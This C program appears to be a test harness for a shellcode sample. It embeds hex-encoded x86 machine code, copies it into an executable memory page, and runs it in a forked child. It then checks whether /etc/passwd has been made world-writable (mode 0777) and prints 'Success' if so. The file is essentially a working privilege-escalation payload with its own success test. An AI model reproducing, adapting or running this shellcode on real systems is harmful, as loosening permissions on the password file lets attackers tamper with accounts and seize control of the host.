#include <fcntl.h>
#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "regs/state.h"

#ifndef unused
#define unused(x) ((void)(x))
#endif

#ifndef __victim_path
#define __victim_path "/etc/passwd"
#endif

int main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int fd, ret, wstatus;
  pid_t pid;
  struct stat st;
  struct utsname uts;
  char *pcall;
  char *shellcode = "\x33\xf6\x56\x68\x73\x73\x77\x64"
                    "\x68\x63\x2f\x70\x61\x68\x2f\x2f"
                    "\x65\x74\x8b\xdc\x33\xc9\x41\x41"
                    "\xba\xff\xff\xff\xff\x33\xc0\xb0"
                    "\x44\x56\x51\x53\x52\x50\xcd\x91"
                    "\x8b\xf8\x33\xc9\x66\xb9\xff\x01"
                    "\x56\x56\x51\x53\x57\x33\xc0\xb0"
                    "\x65\x50\xcd\x91\x56\x57\x33\xc0"
                    "\xb0\x06\x50\xcd\x91\x56\x56\x33"
                    "\xc0\xb0\x01\xcd\x91";

  pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
               MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  if (pcall == MAP_FAILED) {
    perror("mmap()");
    ret = -1;
    goto __fallback;
  }

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    goto __must_unmap;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  printf("[*] Copying shellcode into crafted buffer.\n");
  memcpy(pcall, shellcode, strlen(shellcode));

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  pid = fork();

  if (pid < 0) {
    perror("fork()");
    ret = pid;
    goto __must_unmap;
  }

  if (!pid) {
    printf("[*] Executing the shellcode..\n");
    __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
  } else {
    waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
  }

  if ((fd = open(__victim_path, O_RDONLY)) < 0) {
    perror("open()");
    ret = fd;
    goto __must_restore_regs;
  }

  if ((ret = fsync(fd)) < 0) {
    perror("fsync()");
    goto __must_close;
  }

  bzero(&st, sizeof(struct stat));

  if ((ret = fstat(fd, &st)) < 0) {
    perror("stat()");
    goto __must_close;
  }

  if ((st.st_mode & 0xfff) != 0777) {
    printf(" [-] Fail.\n");
    ret = -1;
    goto __must_close;
  }

  printf(" [*] Success.\n");

  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  printf("[*] Cleaning up..\n");
  munmap(pcall, sysconf(_SC_PAGESIZE));

  close(fd);
  return 0;

__must_close:
  close(fd);

__must_restore_regs:
  store_regs(&__serialize_regs(cregs));

__must_unmap:
  munmap(pcall, sysconf(_SC_PAGESIZE));

__fallback:
  return ret;
}
